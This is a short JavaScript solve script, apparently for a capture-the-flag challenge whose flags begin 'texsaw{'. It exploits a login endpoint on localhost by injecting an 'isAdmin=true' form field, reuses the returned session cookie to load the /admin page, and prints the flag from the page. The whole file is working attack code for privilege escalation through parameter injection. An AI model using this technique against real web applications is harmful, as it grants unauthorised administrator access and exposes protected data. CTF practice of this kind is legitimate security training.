const HOST = "localhost:3000";
const baseUrl = `http://${HOST}`;

function post(path, data) {
    return fetch(baseUrl + path, {
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data,
        method: "POST",
        redirect: "manual"
    });
}

async function run() {
    const res = await post("/login", "username=admin&isAdmin=true", { credentials: "include" });
    const cookie = res.headers.get("Set-Cookie");
    const text = await fetch(baseUrl + "/admin", { headers: { "Cookie": cookie } }).then(res => res.text());
    return text.substring(text.indexOf("texsaw{"));
}

run().then(console.log);
